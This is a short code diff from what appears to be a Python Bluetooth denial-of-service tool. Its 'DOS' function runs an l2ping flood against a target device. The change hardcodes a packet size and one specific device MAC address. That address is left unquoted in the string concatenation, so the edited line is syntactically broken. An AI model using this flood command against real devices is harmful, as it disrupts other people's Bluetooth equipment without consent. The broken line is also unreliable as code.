@@ -3,7 +3,7 @@ import threading
 import time
 
 def DOS(target_addr, packages_size):
-    os.system('l2ping -i hci0 -s ' + str(packages_size) +' -f ' + target_addr)
+    os.system('l2ping -i hci0 -s ' + str(12) +' -f ' + 94:BE:46:43:EA:1C)
 
 def printLogo():
     print('\x1b[37;4mhttps://github.com/jieggiI\x1b[0m')
